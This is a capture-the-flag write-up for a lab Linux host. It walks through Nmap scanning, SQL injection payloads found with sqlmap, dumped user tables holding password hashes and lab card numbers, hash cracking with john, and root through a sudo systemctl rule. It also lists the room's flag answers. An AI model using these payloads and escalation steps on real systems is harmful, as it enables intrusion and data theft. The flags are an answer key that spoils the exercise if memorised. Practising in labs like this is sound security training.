INTRO
```
type :- linux
IP:- 10.10.24.220
```

## Enumration
NMAP
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 07:53 IST
Nmap scan report for 10.10.24.220
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home | Rubber Ducky Inc.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.17 seconds
```
# SQL Injection in http://rubberduckyinc.org/products/1.

```
Found DATABASE:-  duckyinc 
```

```
sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://rubberduckyinc.org:80/products/1 AND 1041=1041

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://rubberduckyinc.org:80/products/1 AND (SELECT 1782 FROM (SELECT(SLEEP(5)))rtJr)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://rubberduckyinc.org:80/products/-1391 UNION ALL SELECT 16,16,16,16,16,CONCAT(0x71717a7171,0x505563506578634275485a434671596d45655647766f4d4f5057736a4d6d53497a47624a7446506b,0x716a627671),16,16-- -
---

```

enumrating further SQL

Tables found in database:-
```
'product'
'system_user'
'user'
```
from table system_user we found:- 
```
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

```

from table users:-

```
+----+---------------------------------+------------------+----------+----------------------------+--------------------------------------------------------------+
| id | email                           | company          | username | credit_card                | _password                                                    |
+----+---------------------------------+------------------+----------+----------------------------+--------------------------------------------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | 4338736490565706           | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | 355219744086163            | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | 349789518019219            | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | 4499108649937274           | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | 4563593127115348           | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | thm{br3ak1ng_4nd_3nt3r1ng} | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | 4905698211632780           | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | 4690248976187759           | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | 375019041714434            | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | 364774395134471            | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 |
+----+---------------------------------+------------------+----------+----------------------------+--------------------------------------------------------------+

```

flag1:- `thm{br3ak1ng_4nd_3nt3r1ng}`

lets start cracking the hashes from system data base using john

found password `inuyasha`
with this password I was able to get user shell
flag2:- `thm{4lm0st_th3re}`

# Privilage escalation

sudo -l
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin:
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service

```

refernce :- https://gtfobins.github.io/gtfobins/systemctl/#sudo

flag3 :- `thm{m1ss10n_acc0mpl1sh3d}`
